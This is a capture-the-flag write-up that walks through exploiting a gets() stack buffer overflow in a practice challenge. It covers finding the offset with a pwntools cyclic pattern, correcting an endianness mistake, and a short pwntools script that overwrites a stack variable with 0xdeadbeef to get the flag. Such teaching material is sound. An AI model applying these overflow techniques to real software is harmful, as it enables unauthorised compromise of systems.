Looking at the code, we can immediately see an issue:

```c
long code = 0;
char clutter[SIZE];

// some output stuff

gets(clutter);
```

`gets` has no way to limit the length of the input, and will happily overflow the buffer.
And `code` should be right above it on the stack.
That's easy to test: `SIZE` is 0x100, so just dump 0x200 `a`s into the input, and you'll see the program output `code == 0x6161616161616161`.
That tells us two things:

1. We can in fact overwrite the value; that's good, it means the challenge is solvable.
2. It's 8 bytes, not just 4.

To figure out the exact location on the stack, I used a de Bruijn sequence:

```py
>>> from pwn import *
>>> cyclic(0x200, alphabet='0123456789')
'00001000200030004000500060007000800090011001200130014001500160017001800190021002200230024002500260027002800290031003200330034003500360037003800390041004200430044004500460047004800490051005200530054005500560057005800590061006200630064006500660067006800690071007200730074007500760077007800790081008200830084008500860087008800890091009200930094009500960097009800990101020103010401050106010701080109011101120113011401150116011701180119012101220123012401250126012701280129013101320133013401350136013701380139014101420'
```

Passing that in gives us `code == 0x3730303437303033`.
I know ASCII well enough to tell that's 70047003 just by looking at it, but Python can tell you that too:

```py
>>> (0x3730303437303033).to_bytes(8, 'big')
b'70047003'
```

Then with pwntools we can find the correct offset:

```py
>>> cyclic_find('70047003', '0123456789')
172
```

So let's try 172 `a`s, followed by 8 `b`s, then some `c`s, to make sure we're right on target:

```
What do you see?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbcccccccccccccccccccc
code == 0x0
```

...uhhhh

Okay, so clearly we've done something wrong.
The first hint is that the buffer is 0x100 bytes, which is 256 in decimal -- larger than our attempted overflow size.
So what did we do wrong?

Well, the thing is, I lied a little.
See, the `code ==` line is interpreting the stack value it finds as an *int*, and on the x86 CPUs this program targets, numbers are stored in **little** endian, but we decoded it as big-endian.
That's the `'big'` in the Python code.

Mismatched [endianness] is a really common issue in pwn challenges, especially since the English, left-to-right order that integers are printed in maps most cleanly to big-endian.
In this case, the fix is quite easy:
Just reverse the string we're finding in the cyclic sequence.
(You can also re-run the `to_bytes` line with `'little'` instead.)

Then do the other steps again, and this time we get position 264.
Try *264* `a`s, then 8 `b`s, then 20 `c`s, and see if that works:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbcccccccccccccccccccc
code == 0x6262626262626262
```

62 is indeed the ASCII hex for `b`, and we don't see any `61` or `63`, so it's worked!
Now we just need to put in the 8 bytes for `0xdeadbeef`, in little endian, and for that I'm turning to Python:

```py
from pwn import *

tube = # build a `process` or `remote` from the command-line arguments

tube.recvuntil(b'see?\n')
tube.sendline(b'a' * 264 + (0xdeadbeef).to_bytes(8, 'little'))
tube.interactive()
```

Locally, that errors out because the challenge tries to `cat flag.txt`, which doesn't exist.
But remotely, it works just fine, and delivers us a flag.

My [solve script](./solve.py) is a little uglier than usual, since I'm not on my usual machine.
But it still works fine, as long as you call it exactly right.
